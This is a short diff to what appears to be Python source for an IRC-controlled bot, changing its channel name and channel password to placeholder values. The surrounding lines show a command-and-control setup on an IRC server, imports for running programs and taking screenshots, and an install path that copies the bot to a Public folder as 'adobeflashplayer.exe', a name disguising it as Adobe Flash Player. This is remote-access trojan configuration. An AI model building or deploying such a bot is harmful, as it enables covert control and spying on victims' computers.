@@ -18,8 +18,8 @@ import subprocess # For function run(): to execute program
 import time, datetime# For function screenshot():
 
 ircServer= "chat.freenode.net"	# Address Server Irc
-ircChanne= "#amarula424217"			# Channel for Bot connect
-ircPwdCha= "zombieland"					# Password of Channel, if there enter the password or leave blank
+ircChanne= "#seucanal"			# Channel for Bot connect
+ircPwdCha= "passdocanal"					# Password of Channel, if there enter the password or leave blank
 botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
 botPass= "raise"				# Not obligatory. A name for the welcome help
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
